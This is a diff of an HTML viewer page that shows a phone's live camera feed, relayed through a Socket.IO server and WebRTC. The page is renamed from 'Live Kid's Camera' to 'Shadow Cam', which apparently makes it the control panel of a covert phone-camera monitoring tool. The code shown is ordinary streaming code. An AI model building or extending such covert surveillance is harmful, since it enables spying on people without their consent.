@@ -3,155 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Kid's Camera</title>
-    <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
+    <title>Shadow Live Camera</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        body {
-            margin: 0; padding: 0;
-            background-color: #000; color: #fff;
-            display: flex; flex-direction: column;
-            align-items: center; justify-content: center;
-            height: 100vh; overflow: hidden;
-            font-family: sans-serif;
-        }
-
-        #camContainer {
-            position: relative;
-            width: 90%; max-width: 360px;
-            aspect-ratio: 9/16;
-            background: #111;
-            border: 2px solid #333;
-            border-radius: 15px;
-            display: flex; align-items: center; justify-content: center;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
-        }
-
-        #camStream {
-            width: 100%; height: 100%;
-            object-fit: contain; /* Video stretch nahi hogi */
-            display: none; 
-            /* transform: rotate(0deg); Android code me rotate handle karna behtar hai */
-        }
-
-        .status-msg { text-align: center; z-index: 10; }
-        .spinner {
-            width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #00f3ff;
-            border-radius: 50%; animation: spin 1s infinite linear; margin: 0 auto 10px;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        .controls {
-            margin-top: 20px;
-            display: flex; gap: 25px;
-            background: rgba(255,255,255,0.1);
-            padding: 15px 30px;
-            border-radius: 40px;
-            backdrop-filter: blur(10px);
-        }
-
-        .btn {
-            background: none; border: none; color: white;
-            font-size: 1.8rem; cursor: pointer;
-            transition: 0.3s;
-        }
-        .btn:hover { color: #00f3ff; transform: scale(1.2); }
-        .btn-red { color: #ff4444; }
+        :root { --bg: #0a0a0a; --accent: #00ff88; --panel: #161616; }
+        body { margin: 0; background: var(--bg); color: white; font-family: sans-serif; overflow: hidden; }
         
-        .device-info {
-            position: absolute; top: 10px; left: 10px;
-            background: rgba(0,0,0,0.5); padding: 5px 10px;
-            border-radius: 5px; font-size: 0.8rem;
+        .header { padding: 15px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
+        .status { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
+        .dot { height: 10px; width: 10px; background: #ff3333; border-radius: 50%; }
+        .dot.active { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+
+        .video-container { 
+            width: 100vw; height: calc(100vh - 70px); 
+            display: flex; justify-content: center; align-items: center; background: #000;
         }
+        
+        /* असली वीडियो प्लेयर */
+        #remoteVideo { 
+            max-width: 100%; max-height: 100%; 
+            border-radius: 10px; transform: rotate(0deg); /* ज़रूरत पड़ने पर यहाँ से घुमा सकते हो */
+        }
+
+        .no-video { position: absolute; color: #444; text-align: center; }
+        
+        .controls { 
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            display: flex; gap: 20px; background: rgba(0,0,0,0.6); padding: 15px 30px;
+            border-radius: 50px; backdrop-filter: blur(10px); border: 1px solid #444;
+        }
+        .btn { color: white; font-size: 1.5rem; cursor: pointer; transition: 0.3s; }
+        .btn:hover { color: var(--accent); scale: 1.2; }
     </style>
 </head>
 <body>
 
-    <div id="camContainer">
-        <div class="device-info" id="devTag">ID: Unknown</div>
-        <img id="camStream" src="" alt="Stream">
-        
-        <div id="statusBox" class="status-msg">
-            <div class="spinner"></div>
-            <p id="statusText">Connecting to Server...</p>
+    <div class="header">
+        <div style="color: var(--accent); font-weight: bold;"><i class="fa-solid fa-ghost"></i> SHADOW CAM</div>
+        <div class="status">
+            <span id="stat-dot" class="dot"></span>
+            <span id="stat-text">Connecting Server...</span>
         </div>
     </div>
 
-    <div class="controls">
-        <button class="btn" title="Front Camera" onclick="sendCamCommand('CAM_FRONT')">
-            <i class="fa-solid fa-user-circle"></i>
-        </button>
-        
-        <button class="btn btn-red" title="Reset" onclick="location.reload()">
-            <i class="fa-solid fa-power-off"></i>
-        </button>
+    <div class="video-container">
+        <div id="loader" class="no-video">
+            <i class="fa-solid fa-circle-notch fa-spin fa-3x"></i>
+            <p>Waiting for Phone Stream...</p>
+        </div>
+        <video id="remoteVideo" autoplay playsinline></video>
+    </div>
 
-        <button class="btn" title="Back Camera" onclick="sendCamCommand('CAM_BACK')">
-            <i class="fa-solid fa-camera-rotate"></i>
-        </button>
+    <div class="controls">
+        <div class="btn" onclick="location.reload()" title="Refresh"><i class="fa-solid fa-rotate"></i></div>
+        <div class="btn" style="color: #ff3333;" onclick="window.close()" title="Stop"><i class="fa-solid fa-circle-stop"></i></div>
     </div>
 
     <script>
-        const API_BASE = 'https://child-v9no.onrender.com'; 
-        const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id');
-        let socket = null;
+        const SERVER_URL = "https://child-v9no.onrender.com"; 
+        let socket, peerConnection;
+        let deviceId = new URLSearchParams(window.location.search).get('id');
 
-        const imgElement = document.getElementById('camStream');
-        const statusBox = document.getElementById('statusBox');
-        const statusText = document.getElementById('statusText');
+        const config = {
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+        };
 
-        if (!DEVICE_ID) {
-            statusText.innerText = "❌ No Device ID Provided!";
-            document.querySelector('.spinner').style.display = 'none';
+        if (!deviceId) {
+            document.getElementById('stat-text').innerText = "ERROR: No ID Found";
         } else {
-            document.getElementById('devTag').innerText = "ID: " + DEVICE_ID;
-            startSocket();
+            init();
         }
 
-        function startSocket() {
-            socket = io(API_BASE);
-
-            socket.on('connect', () => {
-                console.log("Connected to Server");
-                statusText.innerText = "Waiting for Camera...";
-            });
-
-            // 🔥 IMPORTANT: Frame receive karna (Server ke 'video-frame' se match kiya)
-            socket.on('display-frame', (data) => {
-                // Check karna ki frame isi device ka hai
-                if(data.id === DEVICE_ID || data.deviceId === DEVICE_ID) {
-                    statusBox.style.display = 'none';
-                    imgElement.style.display = 'block';
-                    imgElement.src = "data:image/jpeg;base64," + data.frame;
-                }
-            });
-
-            socket.on('disconnect', () => {
-                statusBox.style.display = 'block';
-                imgElement.style.display = 'none';
-                statusText.innerText = "Offline - Reconnecting...";
-            });
-        }
-
-        function sendCamCommand(action) {
-            if(!socket || !socket.connected) {
-                alert("Server not connected!");
-                return;
-            }
+        function init() {
+            socket = io(SERVER_URL);
             
-            console.log("Sending Command:", action, "to", DEVICE_ID);
-            
-            // 🔥 Server ko command bhejo (Server ise Android tak pahuchayega)
-            socket.emit('admin-command', {
-                device_id: DEVICE_ID,
-                command: action
+            socket.on("connect", () => {
+                document.getElementById('stat-dot').classList.add('active');
+                document.getElementById('stat-text').innerText = "Online: " + deviceId;
+                socket.emit("join", deviceId);
+                console.log("Joined room:", deviceId);
             });
-            
-            // Visual feedback
-            statusText.innerText = "Requesting " + action + "...";
-            statusBox.style.display = 'block';
+
+            // 🔥 PHONE SE OFFER AAYEGA
+            socket.on("offer", async (data) => {
+                console.log("Offer Received from phone");
+                document.getElementById('loader').style.display = 'none';
+                
+                peerConnection = new RTCPeerConnection(config);
+
+                // Jab video track mil jaye
+                peerConnection.ontrack = (event) => {
+                    console.log("Got Track!");
+                    const video = document.getElementById('remoteVideo');
+                    if (video.srcObject !== event.streams[0]) {
+                        video.srcObject = event.streams[0];
+                    }
+                };
+
+                // ICE Candidates bhejna
+                peerConnection.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        socket.emit("candidate", { room: deviceId, candidate: event.candidate });
+                    }
+                };
+
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer || data));
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+
+                socket.emit("answer", { room: deviceId, answer: answer });
+            });
+
+            // Candidate handle karna
+            socket.on("candidate", async (data) => {
+                try {
+                    if (peerConnection) {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                    }
+                } catch (e) { console.error(e); }
+            });
+
+            socket.on("disconnect", () => {
+                document.getElementById('stat-dot').classList.remove('active');
+                document.getElementById('stat-text').innerText = "Server Disconnected";
+            });
         }
     </script>
 </body>
